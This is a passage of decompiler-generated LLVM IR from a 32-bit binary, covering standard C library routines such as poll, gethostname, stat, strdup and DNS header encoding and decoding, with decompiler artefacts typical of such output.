dec_label_pc_1de14:                               ; preds = %dec_label_pc_1dbec, %dec_label_pc_1dc10
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1de18

dec_label_pc_1de18:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1dbd8, %dec_label_pc_1dbb8, %dec_label_pc_1de00, %dec_label_pc_1dc74, %dec_label_pc_1de14
  %v0_1de18 = load i32, i32* @r5, align 4
  store i32 %v0_1de18, i32* %r0.global-to-local, align 4
  store i32 %v15_1db30, i32* %r8.global-to-local, align 4
  ret i32 %v0_1de18

; uselistorder directives
  uselistorder i32 %v0_1dd94, { 1, 0 }
  uselistorder i32 %v1_1dd70, { 1, 0, 2 }
  uselistorder i32 %v1_1dd6c, { 1, 0 }
  uselistorder i32 %v0_1dd3c, { 1, 0, 2 }
  uselistorder i32 %v2_1dd30, { 1, 0 }
  uselistorder i32 %v1_1dc30, { 2, 1, 0 }
  uselistorder i32 %v1_1dc24, { 1, 0 }
  uselistorder i32 %v0_1dbf8, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_1dba4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1db44, { 1, 0 }
  uselistorder i32 %v0_1db38, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 0, 1, 6, 5, 8, 7, 10, 9, 2, 12, 11, 14, 13, 15, 17, 16, 19, 18, 20 }
  uselistorder i32 ()* @free, { 21, 20, 19, 18, 17, 16, 10, 9, 8, 7, 6, 15, 14, 13, 12, 5, 4, 3, 2, 11, 29, 28, 27, 26, 1, 25, 24, 23, 22, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_1de18, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_1de14, { 1, 0 }
  uselistorder label %dec_label_pc_1de00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ddbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1dbec, { 2, 0, 1 }
}

define i32 @__GI_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1de24 = load i32, i32* @r4, align 4
  store i32 %v3_1de24, i32* %stack_var_-8, align 4
  %v5_1de28 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_1de28, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1de28, -4095
  br i1 %tmp, label %dec_label_pc_1de48, label %dec_label_pc_1de38

dec_label_pc_1de38:                               ; preds = %entry
  %v0_1de38 = call i32 @__GI___errno_location()
  %v0_1de3c = load i32, i32* %r4.global-to-local, align 4
  %v1_1de3c = sub i32 0, %v0_1de3c
  %v2_1de40 = inttoptr i32 %v0_1de38 to i32*
  store i32 %v1_1de3c, i32* %v2_1de40, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1de48

dec_label_pc_1de48:                               ; preds = %entry, %dec_label_pc_1de38
  %v0_1de48 = phi i32 [ %v5_1de28, %entry ], [ -1, %dec_label_pc_1de38 ]
  %v2_1de4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1de4c, i32* @r4, align 4
  ret i32 %v0_1de48

; uselistorder directives
  uselistorder i32 %v5_1de28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1de48, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-343 = alloca i32, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v0_1de64 = call i32 @uname()
  %v7_1de68 = icmp eq i32 %v0_1de64, -1
  br i1 %v7_1de68, label %bb, label %dec_label_pc_1de78

bb:                                               ; preds = %entry
  store i32 %v0_1de64, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1de78:                               ; preds = %entry
  %v2_1de78 = ptrtoint i32* %stack_var_-343 to i32
  %tmp8 = bitcast i32* %stack_var_-343 to i8*
  %v3_1de80 = call i32 @strlen(i8* %tmp8)
  %v1_1de84 = add i32 %v3_1de80, 1
  %v1_1de88 = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1de84, %v1_1de88
  br i1 %tmp, label %dec_label_pc_1de90, label %dec_label_pc_1dea4

dec_label_pc_1de90:                               ; preds = %dec_label_pc_1de78
  %v0_1de90 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1de9c = inttoptr i32 %v0_1de90 to i32*
  store i32 22, i32* %v2_1de9c, align 4
  %v0_1deb4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1dea4:                               ; preds = %dec_label_pc_1de78
  %v0_1dea4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_1de78, i32* @r1, align 4
  %v2_1deac = inttoptr i32 %v0_1dea4 to i8*
  %v3_1deac = call i32 @strcpy(i8* %v2_1deac, i32 %v2_1de78)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1deb4

dec_label_pc_1deb4:                               ; preds = %bb, %dec_label_pc_1de90, %dec_label_pc_1dea4
  %v0_1deb4 = phi i32 [ %v0_1de64, %bb ], [ %v0_1deb4.pre, %dec_label_pc_1de90 ], [ 0, %dec_label_pc_1dea4 ]
  ret i32 %v0_1deb4

; uselistorder directives
  uselistorder i32 %v2_1de78, { 1, 0 }
  uselistorder i32 %v0_1de64, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9 }
  uselistorder i32 22, { 3, 18, 4, 20, 5, 14, 15, 21, 0, 19, 6, 7, 8, 9, 16, 10, 11, 12, 22, 13, 23, 1, 2, 17 }
  uselistorder label %dec_label_pc_1deb4, { 2, 1, 0 }
}

define i32 @__GI_stat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %tmp5 = bitcast i32* %stack_var_-72 to %stat*
  %v6_1ded0 = call i32 @stat(i8* %arg1, %stat* %tmp5)
  store i32 %v6_1ded0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_1ded0, -4095
  br i1 %tmp, label %dec_label_pc_1def4, label %dec_label_pc_1dee0

dec_label_pc_1dee0:                               ; preds = %entry
  %v0_1dee0 = call i32 @__GI___errno_location()
  %v0_1dee4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1dee4 = sub i32 0, %v0_1dee4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1deec = inttoptr i32 %v0_1dee0 to i32*
  store i32 %v1_1dee4, i32* %v2_1deec, align 4
  br label %dec_label_pc_1df04

dec_label_pc_1def4:                               ; preds = %entry
  %v2_1def4 = icmp eq i32 %v6_1ded0, 0
  br i1 %v2_1def4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1def4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1def4, %bb
  call void @__pseudo_cond_branch(i1 %v2_1def4, i32 ptrtoint (i32* @global_var_1c0c8.1701 to i32))
  br label %dec_label_pc_1df04

dec_label_pc_1df04:                               ; preds = %dec_label_pc_1dee0, %.thread
  %v0_1df04 = load i32, i32* %r4.global-to-local, align 4
  ret i32 %v0_1df04

; uselistorder directives
  uselistorder i32 %v6_1ded0, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1df04, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1df4c, label %dec_label_pc_1df38

dec_label_pc_1df38:                               ; preds = %entry
  %v0_1df38 = call i32 @__GI___errno_location()
  %v0_1df3c = load i32, i32* %r4.global-to-local, align 4
  %v1_1df3c = sub i32 0, %v0_1df3c
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1df44 = inttoptr i32 %v0_1df38 to i32*
  store i32 %v1_1df3c, i32* %v2_1df44, align 4
  %v0_1df54.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1df54

dec_label_pc_1df4c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1df4c = icmp eq i32 %arg1, 0
  br i1 %v2_1df4c, label %dec_label_pc_1df60, label %dec_label_pc_1df54

dec_label_pc_1df54:                               ; preds = %dec_label_pc_1df4c, %dec_label_pc_1df38
  %v0_1df54 = phi i32 [ %arg1, %dec_label_pc_1df4c ], [ %v0_1df54.pre, %dec_label_pc_1df38 ]
  %v3_1df58 = ashr i32 %v0_1df54, 31
  br label %dec_label_pc_1df64

dec_label_pc_1df60:                               ; preds = %dec_label_pc_1df4c
  br label %dec_label_pc_1df64

dec_label_pc_1df64:                               ; preds = %dec_label_pc_1df54, %dec_label_pc_1df60
  %v11_1df68 = phi i32 [ %v3_1df58, %dec_label_pc_1df54 ], [ %tmp8, %dec_label_pc_1df60 ]
  ret i32 %v11_1df68

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1df64, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1df70 = load i32, i32* @r0, align 4
  %v1_1df70 = load i32, i32* @r1, align 4
  %v2_1df70 = inttoptr i32 %v0_1df70 to i8*
  %v3_1df70 = call i32 @_memcpy(i8* %v2_1df70, i32 %v1_1df70)
  ret i32 %v3_1df70

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1df80 = load i32, i32* @r4, align 4
  store i32 %v3_1df80, i32* %stack_var_-16, align 4
  %v9_1df80 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_1df88 = call i32 @strlen(i8* %arg1)
  %v1_1df8c = add i32 %v3_1df88, 1
  store i32 %v1_1df8c, i32* @r4, align 4
  %v1_1df94 = call i32 @malloc(i32 %v1_1df8c)
  store i32 %v1_1df94, i32* %r5.global-to-local, align 4
  %v2_1df98 = icmp eq i32 %v1_1df94, 0
  br i1 %v2_1df98, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_1dfa4 = xor i1 %v2_1df98, true
  call void @__pseudo_cond_branch(i1 %v1_1dfa4, i32 ptrtoint (i32* @global_var_15840.1559 to i32))
  %v0_1dfa8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1dfac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1dfac, i32* @r4, align 4
  store i32 %v9_1df80, i32* @r6, align 4
  ret i32 %v0_1dfa8

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 12, 11, 10, 4, 3, 9, 8, 7, 13, 6, 5, 14, 23, 1, 22, 21, 20, 19, 18, 17, 16, 15, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  store i32 %arg2, i32* @lr, align 4
  %v7_1dfc0 = icmp sgt i32 %arg3, 11
  br i1 %v7_1dfc0, label %bb14, label %bb

bb:                                               ; preds = %entry
  ret i32 -1

bb14:                                             ; preds = %entry
  %tmp15 = inttoptr i32 %arg2 to i8*
  %v1_1dfc8 = add i32 %tmp, 2
  %v2_1dfc8 = inttoptr i32 %v1_1dfc8 to i8*
  %v3_1dfc8 = load i8, i8* %v2_1dfc8, align 1
  store i8 %v3_1dfc8, i8* %tmp15, align 1
  %v0_1dfd0 = load i32, i32* @ip, align 4
  %v1_1dfd0 = inttoptr i32 %v0_1dfd0 to i32*
  %v2_1dfd0 = load i32, i32* %v1_1dfd0, align 4
  %v1_1dfd4 = trunc i32 %v2_1dfd0 to i8
  %v4_1dfd4 = add i32 %arg2, 1
  %v5_1dfd4 = inttoptr i32 %v4_1dfd4 to i8*
  store i8 %v1_1dfd4, i8* %v5_1dfd4, align 1
  %v0_1dfd8 = load i32, i32* @ip, align 4
  %v1_1dfd8 = add i32 %v0_1dfd8, 8
  %v2_1dfd8 = inttoptr i32 %v1_1dfd8 to i32*
  %v3_1dfd8 = load i32, i32* %v2_1dfd8, align 4
  %v1_1dfdc = add i32 %v0_1dfd8, 20
  %v2_1dfdc = inttoptr i32 %v1_1dfdc to i32*
  %v3_1dfdc = load i32, i32* %v2_1dfdc, align 4
  %v1_1dfe0 = add i32 %v0_1dfd8, 4
  %v2_1dfe0 = inttoptr i32 %v1_1dfe0 to i32*
  %v3_1dfe0 = load i32, i32* %v2_1dfe0, align 4
  %v1_1dfe4 = add i32 %v0_1dfd8, 12
  %v2_1dfe4 = inttoptr i32 %v1_1dfe4 to i32*
  %v3_1dfe4 = load i32, i32* %v2_1dfe4, align 4
  %v2_1dfe8 = icmp eq i32 %v3_1dfdc, 0
  br i1 %v2_1dfe8, label %bb17, label %bb16

bb16:                                             ; preds = %bb14
  br label %bb17

bb17:                                             ; preds = %bb14, %bb16
  %v0_1dff8 = phi i32 [ 0, %bb14 ], [ 1, %bb16 ]
  %v1_1dff0 = urem i32 %v3_1dfd8, 16
  %v2_1dff4 = icmp eq i32 %v3_1dfe0, 0
  %v4_1dff8 = mul nuw nsw i32 %v1_1dff0, 8
  %v5_1dff8 = or i32 %v0_1dff8, %v4_1dff8
  %v1_1dffc = add i32 %v0_1dfd8, 16
  %v2_1dffc = inttoptr i32 %v1_1dffc to i32*
  %v3_1dffc = load i32, i32* %v2_1dffc, align 4
  %. = select i1 %v2_1dff4, i32 0, i32 128
  %v2_1e008 = icmp eq i32 %v3_1dfe4, 0
  %storemerge9 = select i1 %v2_1e008, i32 0, i32 4
  %v2_1e014 = or i32 %v5_1dff8, %.
  %v2_1e018 = icmp eq i32 %v3_1dffc, 0
  %.26 = select i1 %v2_1e018, i32 0, i32 2
  %v2_1e024 = or i32 %v2_1e014, %storemerge9
  %v2_1e028 = or i32 %v2_1e024, %.26
  %v1_1e02c = trunc i32 %v2_1e028 to i8
  %v2_1e02c = load i32, i32* @lr, align 4
  %v3_1e02c = add i32 %v2_1e02c, 2
  %v4_1e02c = inttoptr i32 %v3_1e02c to i8*
  store i8 %v1_1e02c, i8* %v4_1e02c, align 1
  %v0_1e030 = load i32, i32* @ip, align 4
  %v1_1e030 = add i32 %v0_1e030, 24
  %v1_1e034 = inttoptr i32 %v1_1e030 to i32*
  %v2_1e034 = load i32, i32* %v1_1e034, align 4
  %v3_1e034 = add i32 %v0_1e030, 28
  %v4_1e034 = inttoptr i32 %v3_1e034 to i32*
  %v5_1e034 = load i32, i32* %v4_1e034, align 4
  %v2_1e038 = icmp eq i32 %v2_1e034, 0
  %storemerge11 = select i1 %v2_1e038, i32 0, i32 128
  %v1_1e044 = urem i32 %v5_1e034, 16
  %v2_1e048 = or i32 %v1_1e044, %storemerge11
  %v1_1e04c = trunc i32 %v2_1e048 to i8
  %v2_1e04c = load i32, i32* @lr, align 4
  %v3_1e04c = add i32 %v2_1e04c, 3
  %v4_1e04c = inttoptr i32 %v3_1e04c to i8*
  store i8 %v1_1e04c, i8* %v4_1e04c, align 1
  %v0_1e050 = load i32, i32* @ip, align 4
  %v1_1e050 = add i32 %v0_1e050, 34
  %v2_1e050 = inttoptr i32 %v1_1e050 to i8*
  %v3_1e050 = load i8, i8* %v2_1e050, align 1
  %v2_1e054 = load i32, i32* @lr, align 4
  %v3_1e054 = add i32 %v2_1e054, 4
  %v4_1e054 = inttoptr i32 %v3_1e054 to i8*
  store i8 %v3_1e050, i8* %v4_1e054, align 1
  %v0_1e058 = load i32, i32* @ip, align 4
  %v1_1e058 = add i32 %v0_1e058, 32
  %v2_1e058 = inttoptr i32 %v1_1e058 to i32*
  %v3_1e058 = load i32, i32* %v2_1e058, align 4
  %v1_1e05c = trunc i32 %v3_1e058 to i8
  %v2_1e05c = load i32, i32* @lr, align 4
  %v3_1e05c = add i32 %v2_1e05c, 5
  %v4_1e05c = inttoptr i32 %v3_1e05c to i8*
  store i8 %v1_1e05c, i8* %v4_1e05c, align 1
  %v0_1e060 = load i32, i32* @ip, align 4
  %v1_1e060 = add i32 %v0_1e060, 38
  %v2_1e060 = inttoptr i32 %v1_1e060 to i8*
  %v3_1e060 = load i8, i8* %v2_1e060, align 1
  %v2_1e064 = load i32, i32* @lr, align 4
  %v3_1e064 = add i32 %v2_1e064, 6
  %v4_1e064 = inttoptr i32 %v3_1e064 to i8*
  store i8 %v3_1e060, i8* %v4_1e064, align 1
  %v0_1e068 = load i32, i32* @ip, align 4
  %v1_1e068 = add i32 %v0_1e068, 36
  %v2_1e068 = inttoptr i32 %v1_1e068 to i32*
  %v3_1e068 = load i32, i32* %v2_1e068, align 4
  %v1_1e06c = trunc i32 %v3_1e068 to i8
  %v2_1e06c = load i32, i32* @lr, align 4
  %v3_1e06c = add i32 %v2_1e06c, 7
  %v4_1e06c = inttoptr i32 %v3_1e06c to i8*
  store i8 %v1_1e06c, i8* %v4_1e06c, align 1
  %v0_1e070 = load i32, i32* @ip, align 4
  %v1_1e070 = add i32 %v0_1e070, 42
  %v2_1e070 = inttoptr i32 %v1_1e070 to i8*
  %v3_1e070 = load i8, i8* %v2_1e070, align 1
  %v2_1e074 = load i32, i32* @lr, align 4
  %v3_1e074 = add i32 %v2_1e074, 8
  %v4_1e074 = inttoptr i32 %v3_1e074 to i8*
  store i8 %v3_1e070, i8* %v4_1e074, align 1
  %v0_1e078 = load i32, i32* @ip, align 4
  %v1_1e078 = add i32 %v0_1e078, 40
  %v2_1e078 = inttoptr i32 %v1_1e078 to i32*
  %v3_1e078 = load i32, i32* %v2_1e078, align 4
  %v1_1e07c = trunc i32 %v3_1e078 to i8
  %v2_1e07c = load i32, i32* @lr, align 4
  %v3_1e07c = add i32 %v2_1e07c, 9
  %v4_1e07c = inttoptr i32 %v3_1e07c to i8*
  store i8 %v1_1e07c, i8* %v4_1e07c, align 1
  %v0_1e080 = load i32, i32* @ip, align 4
  %v1_1e080 = add i32 %v0_1e080, 46
  %v2_1e080 = inttoptr i32 %v1_1e080 to i8*
  %v3_1e080 = load i8, i8* %v2_1e080, align 1
  %v2_1e084 = load i32, i32* @lr, align 4
  %v3_1e084 = add i32 %v2_1e084, 10
  %v4_1e084 = inttoptr i32 %v3_1e084 to i8*
  store i8 %v3_1e080, i8* %v4_1e084, align 1
  %v0_1e088 = load i32, i32* @ip, align 4
  %v1_1e088 = add i32 %v0_1e088, 44
  %v2_1e088 = inttoptr i32 %v1_1e088 to i32*
  %v3_1e088 = load i32, i32* %v2_1e088, align 4
  %v1_1e090 = trunc i32 %v3_1e088 to i8
  %v2_1e090 = load i32, i32* @lr, align 4
  %v3_1e090 = add i32 %v2_1e090, 11
  %v4_1e090 = inttoptr i32 %v3_1e090 to i8*
  store i8 %v1_1e090, i8* %v4_1e090, align 1
  ret i32 12

; uselistorder directives
  uselistorder i32 %v0_1dfd8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i32 38, { 4, 1, 2, 5, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1e098 = load i8, i8* %arg1, align 1
  %v4_1e098 = zext i8 %v3_1e098 to i32
  %v2_1e09c = add i32 %tmp, 1
  %v3_1e09c = inttoptr i32 %v2_1e09c to i8*
  %v4_1e09c = load i8, i8* %v3_1e09c, align 1
  %v5_1e09c = zext i8 %v4_1e09c to i32
  %v4_1e0a0 = mul nuw nsw i32 %v4_1e098, 256
  %v5_1e0a0 = or i32 %v5_1e09c, %v4_1e0a0
  %v2_1e0a4 = inttoptr i32 %arg2 to i32*
  store i32 %v5_1e0a0, i32* %v2_1e0a4, align 4
  %v2_1e0a8 = add i32 %tmp, 2
  %v3_1e0a8 = inttoptr i32 %v2_1e0a8 to i8*
  %v4_1e0a8 = load i8, i8* %v3_1e0a8, align 1
  %tmp4 = icmp slt i8 %v4_1e0a8, 0
  %v3_1e0ac = zext i1 %tmp4 to i32
  %v2_1e0b0 = add i32 %arg2, 4
  %v3_1e0b0 = inttoptr i32 %v2_1e0b0 to i32*
  store i32 %v3_1e0ac, i32* %v3_1e0b0, align 4
  %v4_1e0b4 = load i8, i8* %v3_1e0a8, align 1
  %div = udiv i8 %v4_1e0b4, 8
  %tmp5 = urem i8 %div, 16
  %v1_1e0bc = zext i8 %tmp5 to i32
  %v2_1e0c0 = add i32 %arg2, 8
  %v3_1e0c0 = inttoptr i32 %v2_1e0c0 to i32*
  store i32 %v1_1e0bc, i32* %v3_1e0c0, align 4
  %v4_1e0c4 = load i8, i8* %v3_1e0a8, align 1
  %div1 = udiv i8 %v4_1e0c4, 4
  %tmp6 = urem i8 %div1, 2
  %v1_1e0cc = zext i8 %tmp6 to i32
  %v2_1e0d0 = add i32 %arg2, 12
  %v3_1e0d0 = inttoptr i32 %v2_1e0d0 to i32*
  store i32 %v1_1e0cc, i32* %v3_1e0d0, align 4
  %v4_1e0d4 = load i8, i8* %v3_1e0a8, align 1
  %div2 = udiv i8 %v4_1e0d4, 2
  %tmp7 = urem i8 %div2, 2
  %v1_1e0dc = zext i8 %tmp7 to i32
  %v2_1e0e0 = add i32 %arg2, 16
  %v3_1e0e0 = inttoptr i32 %v2_1e0e0 to i32*
  store i32 %v1_1e0dc, i32* %v3_1e0e0, align 4
  %v4_1e0e4 = load i8, i8* %v3_1e0a8, align 1
  %tmp8 = urem i8 %v4_1e0e4, 2
  %v1_1e0e8 = zext i8 %tmp8 to i32
  %v2_1e0ec = add i32 %arg2, 20
  %v3_1e0ec = inttoptr i32 %v2_1e0ec to i32*
  store i32 %v1_1e0e8, i32* %v3_1e0ec, align 4
  %v2_1e0f0 = add i32 %tmp, 3
  %v3_1e0f0 = inttoptr i32 %v2_1e0f0 to i8*
  %v4_1e0f0 = load i8, i8* %v3_1e0f0, align 1
  %tmp9 = icmp slt i8 %v4_1e0f0, 0
  %v3_1e0f4 = zext i1 %tmp9 to i32
  %v2_1e0f8 = add i32 %arg2, 24
  %v3_1e0f8 = inttoptr i32 %v2_1e0f8 to i32*
  store i32 %v3_1e0f4, i32* %v3_1e0f8, align 4
  %v4_1e0fc = load i8, i8* %v3_1e0f0, align 1
  %tmp10 = urem i8 %v4_1e0fc, 16
  %v1_1e100 = zext i8 %tmp10 to i32
  %v2_1e104 = add i32 %arg2, 28
  %v3_1e104 = inttoptr i32 %v2_1e104 to i32*
  store i32 %v1_1e100, i32* %v3_1e104, align 4
  %v2_1e108 = add i32 %tmp, 4
  %v3_1e108 = inttoptr i32 %v2_1e108 to i8*
  %v4_1e108 = load i8, i8* %v3_1e108, align 1
  %v5_1e108 = zext i8 %v4_1e108 to i32
  %v2_1e10c = add i32 %tmp, 5
  %v3_1e10c = inttoptr i32 %v2_1e10c to i8*
  %v4_1e10c = load i8, i8* %v3_1e10c, align 1
  %v5_1e10c = zext i8 %v4_1e10c to i32
  %v4_1e110 = mul nuw nsw i32 %v5_1e108, 256
  %v5_1e110 = or i32 %v5_1e10c, %v4_1e110
  %v2_1e114 = add i32 %arg2, 32
  %v3_1e114 = inttoptr i32 %v2_1e114 to i32*
  store i32 %v5_1e110, i32* %v3_1e114, align 4
  %v2_1e118 = add i32 %tmp, 6
  %v3_1e118 = inttoptr i32 %v2_1e118 to i8*
  %v4_1e118 = load i8, i8* %v3_1e118, align 1
  %v5_1e118 = zext i8 %v4_1e118 to i32
  %v2_1e11c = add i32 %tmp, 7
  %v3_1e11c = inttoptr i32 %v2_1e11c to i8*
  %v4_1e11c = load i8, i8* %v3_1e11c, align 1
  %v5_1e11c = zext i8 %v4_1e11c to i32
  %v4_1e120 = mul nuw nsw i32 %v5_1e118, 256
  %v5_1e120 = or i32 %v5_1e11c, %v4_1e120
  %v2_1e124 = add i32 %arg2, 36
  %v3_1e124 = inttoptr i32 %v2_1e124 to i32*
  store i32 %v5_1e120, i32* %v3_1e124, align 4
  %v2_1e128 = add i32 %tmp, 8
  %v3_1e128 = inttoptr i32 %v2_1e128 to i8*
  %v4_1e128 = load i8, i8* %v3_1e128, align 1
  %v5_1e128 = zext i8 %v4_1e128 to i32
  %v2_1e12c = add i32 %tmp, 9
  %v3_1e12c = inttoptr i32 %v2_1e12c to i8*
  %v4_1e12c = load i8, i8* %v3_1e12c, align 1
  %v5_1e12c = zext i8 %v4_1e12c to i32
  %v4_1e130 = mul nuw nsw i32 %v5_1e128, 256
  %v5_1e130 = or i32 %v5_1e12c, %v4_1e130
  %v2_1e134 = add i32 %arg2, 40
  %v3_1e134 = inttoptr i32 %v2_1e134 to i32*
  store i32 %v5_1e130, i32* %v3_1e134, align 4
  %v2_1e138 = add i32 %tmp, 11
  %v3_1e138 = inttoptr i32 %v2_1e138 to i8*
  %v4_1e138 = load i8, i8* %v3_1e138, align 1
  %v5_1e138 = zext i8 %v4_1e138 to i32
  %v2_1e13c = add i32 %tmp, 10
  %v3_1e13c = inttoptr i32 %v2_1e13c to i8*
  %v4_1e13c = load i8, i8* %v3_1e13c, align 1
  %v5_1e13c = zext i8 %v4_1e13c to i32
  %v4_1e140 = mul nuw nsw i32 %v5_1e13c, 256
  %v5_1e140 = or i32 %v4_1e140, %v5_1e138
  %v2_1e144 = add i32 %arg2, 44
  %v3_1e144 = inttoptr i32 %v2_1e144 to i32*
  store i32 %v5_1e140, i32* %v3_1e144, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 17, 18, 21, 22, 2, 19, 12, 13, 14, 15, 32, 1, 20, 3, 26, 27, 28, 29, 23, 24, 25, 30, 31, 0, 4, 5, 6, 7, 8, 9, 10, 11, 16 }
  uselistorder i32 11, { 22, 23, 8, 9, 24, 25, 12, 13, 14, 26, 34, 27, 4, 5, 6, 7, 28, 29, 30, 31, 32, 33, 0, 15, 16, 17, 10, 18, 19, 11, 3, 2, 1, 20, 21 }
  uselistorder i32 40, { 6, 7, 10, 11, 8, 12, 1, 9, 3, 2, 0, 13, 14, 15, 16, 17, 4, 5 }
  uselistorder i32 9, { 26, 27, 31, 32, 17, 30, 28, 29, 25, 21, 22, 18, 33, 1, 34, 35, 19, 36, 20, 37, 38, 39, 40, 0, 16, 13, 14, 15, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 23, 24 }
  uselistorder i32 36, { 14, 15, 19, 20, 21, 22, 6, 16, 17, 18, 9, 10, 11, 12, 0, 1, 2, 4, 7, 3, 23, 24, 5, 8, 13 }
  uselistorder i32 7, { 20, 21, 14, 15, 0, 1, 9, 10, 2, 23, 22, 3, 4, 5, 16, 6, 7, 17, 11, 12, 13, 8, 18, 19 }
  uselistorder i32 5, { 26, 27, 7, 16, 17, 18, 0, 8, 28, 9, 3, 19, 10, 11, 4, 33, 5, 29, 6, 30, 31, 32, 12, 1, 2, 20, 21, 22, 13, 15, 14, 23, 24, 25 }
  uselistorder i32 28, { 34, 7, 8, 1, 2, 39, 40, 45, 47, 9, 10, 46, 11, 12, 41, 48, 35, 36, 23, 24, 25, 26, 59, 37, 38, 33, 49, 13, 3, 42, 43, 50, 44, 14, 4, 51, 52, 53, 54, 55, 56, 57, 0, 58, 27, 28, 29, 5, 6, 30, 19, 18, 16, 17, 22, 20, 21, 31, 15, 32 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 8, 12, 11 }
  uselistorder i8 4, { 1, 2, 3, 0, 4 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
